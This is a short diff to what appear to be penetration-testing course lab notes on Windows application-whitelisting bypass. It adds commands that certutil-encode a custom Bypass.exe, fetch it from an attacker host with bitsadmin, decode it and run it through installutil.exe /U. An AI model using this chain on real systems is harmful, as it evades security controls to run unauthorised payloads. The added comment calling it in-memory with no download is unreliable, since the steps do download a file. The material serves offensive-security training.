@@ -47,3 +47,19 @@ C:\Tools\Bypass.exe -> Fail
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Tools\Bypass.exe --> Success
 
 type C:\Tools\test.txt
+
+-------------------------------------------------------------------------------------------------
+
+# Certutil method to execute payload in memory without downloading from our server
+
+certutil -encode C:\Users\Offsec\source\repos\Bypass\Bypass\bin\x64\Release\Bypass.exe file.txt
+
+type file.txt
+
+bitsadmin /Transfer myJob http://192.168.119.120/file.txt C:\Users\student\enc.txt
+
+certutil -decode enc.txt Bypass.exe
+
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\users\student\Bypass.exe
+
+
